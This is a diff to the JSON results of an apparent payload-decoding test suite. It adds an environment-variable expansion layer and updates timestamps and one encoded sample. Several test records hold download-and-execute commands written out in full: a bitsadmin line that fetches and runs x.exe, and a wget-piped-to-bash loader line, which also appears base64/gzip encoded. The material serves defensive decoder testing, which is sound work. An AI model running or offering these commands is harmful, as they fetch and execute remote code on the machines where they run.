@@ -1,5 +1,5 @@
 {
-  "generated_at": "2026-07-19T06:35:09Z",
+  "generated_at": "2026-07-19T07:41:40Z",
   "total": 12,
   "passed": 12,
   "pass_rate": 1.0,
@@ -197,11 +197,11 @@
       "expect_token": "cmd",
       "match": true,
       "engine": "?",
-      "chain_len": 2,
+      "chain_len": 3,
       "downgrades": 0,
       "http_ms": 0,
-      "decoded_output": "cmd /c bitsadmin /transfer j http://185.220.101.5/x.exe %APPDATA%\\a.exe && %APPDATA%\\a.exe",
-      "output_first_line": "cmd /c bitsadmin /transfer j http://185.220.101.5/x.exe %APPDATA%\\a.exe && %APPDATA%\\a.exe",
+      "decoded_output": "cmd /c bitsadmin /transfer j http://185.220.101.5/x.exe C:\\Users\\Public\\AppData\\Roaming\\a.exe && C:\\Users\\Public\\AppData\\Roaming\\a.exe",
+      "output_first_line": "cmd /c bitsadmin /transfer j http://185.220.101.5/x.exe C:\\Users\\Public\\AppData\\Roaming\\a.exe && C:\\Users\\Public\\AppData\\Roaming\\a.exe",
       "layers": [
         {
           "idx": 0,
@@ -216,6 +216,13 @@
           "bytes": 0,
           "before": "OK",
           "after": "OK"
+        },
+        {
+          "idx": 2,
+          "op": "env-expand",
+          "bytes": 0,
+          "before": "MIXED",
+          "after": "MIXED"
         }
       ]
     },
@@ -275,8 +282,8 @@
     {
       "sample_id": "S08_wget_b64_gzip",
       "wrap": "b64(gzip(P))",
-      "encoded_input": "H4sIAB1wXGoC/ytPTy1R0C3011XIKCkpsNLXN7S00DM11DM0MNAzMdLPyU9MSS3SK85QqFFISizOAAAJAeOYLwAAAA==",
-      "encoded_input_preview": "H4sIAB1wXGoC/ytPTy1R0C3011XIKCkpsNLXN7S00DM11DM0MNAzMdLPyU9MSS3SK85QqFFISizOAAAJAeOYLwAAAA==",
+      "encoded_input": "H4sIABF/XGoC/ytPTy1R0C3011XIKCkpsNLXN7S00DM11DM0MNAzMdLPyU9MSS3SK85QqFFISizOAAAJAeOYLwAAAA==",
+      "encoded_input_preview": "H4sIABF/XGoC/ytPTy1R0C3011XIKCkpsNLXN7S00DM11DM0MNAzMdLPyU9MSS3SK85QqFFISizOAAAJAeOYLwAAAA==",
       "input_len": 92,
       "expected_plaintext": "wget -qO- http://198.51.100.42/loader.sh | bash",
       "expect_token": "wget",
@@ -410,11 +417,11 @@
       "expect_token": "cmd",
       "match": true,
       "engine": "?",
-      "chain_len": 1,
+      "chain_len": 2,
       "downgrades": 0,
       "http_ms": 0,
-      "decoded_output": "cmd /c bitsadmin /transfer j http://185.220.101.5/x.exe %APPDATA%\\a.exe && %APPDATA%\\a.exe",
-      "output_first_line": "cmd /c bitsadmin /transfer j http://185.220.101.5/x.exe %APPDATA%\\a.exe && %APPDATA%\\a.exe",
+      "decoded_output": "cmd /c bitsadmin /transfer j http://185.220.101.5/x.exe C:\\Users\\Public\\AppData\\Roaming\\a.exe && C:\\Users\\Public\\AppData\\Roaming\\a.exe",
+      "output_first_line": "cmd /c bitsadmin /transfer j http://185.220.101.5/x.exe C:\\Users\\Public\\AppData\\Roaming\\a.exe && C:\\Users\\Public\\AppData\\Roaming\\a.exe",
       "layers": [
         {
           "idx": 0,
@@ -422,6 +429,13 @@
           "bytes": 0,
           "before": "OK",
           "after": "OK"
+        },
+        {
+          "idx": 1,
+          "op": "env-expand",
+          "bytes": 0,
+          "before": "MIXED",
+          "after": "MIXED"
         }
       ]
     }
